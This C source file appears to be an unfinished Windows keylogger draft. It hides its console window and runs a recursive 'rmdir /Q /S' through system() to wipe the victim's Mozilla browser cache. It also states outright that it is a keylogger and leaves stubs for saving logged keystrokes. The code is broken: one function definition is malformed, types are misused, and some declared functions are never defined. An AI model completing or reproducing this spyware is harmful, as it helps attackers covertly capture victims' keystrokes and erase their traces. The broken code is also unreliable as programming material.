// add relevant libraries 
#include<stdio.h>
#include<windows.h>

// user defined functions
// function declarations to delete cache
void ClearBrowserCache();
void ClearMozillaCache();
void ClearChromecache();
void ClearOperaCache();

// function definition for ClearBrowserCache
void ClearBrowserCache()
{
    ClearMozillaCache();
    ClearChromecache(); //future works
    ClearOperaCache(); //future works
}


// function definition to delete mozilla cache
void ClearMozilla{
    //local variable declarations
char path[256] = "";
char username = '';
char path2[256] = "";
char command[256] = "";
// building path for cache folder and concatenanting
strcat(path, "C:\\Users\\");
// extracting host's user : username
username = system("USERNAME");
// concatenanting with path
strcat(path, username);
//defining rest of the path
path2 = "Appdata\\Mozilla\\cache";
//concatenating with path
strcat(path, path2);
// windows command to delete a directory recursively
command = "rmdir /Q /S ";
// concatenating path with command
strcat(command, path);
// running command using system 
system(command);

}
// function to save keylogged data to text file
void Save(); // Future Workss

// main function
int main(){
    // function to free console window from application
    FreeConsole();
    // function call for clearbowsercache function
    ClearBrowserCache();
    //place holder will be removed in the future
    printf("Hello World, this is a keylogger program");
    // Future Work: ADD rest of the code
    return 0;
}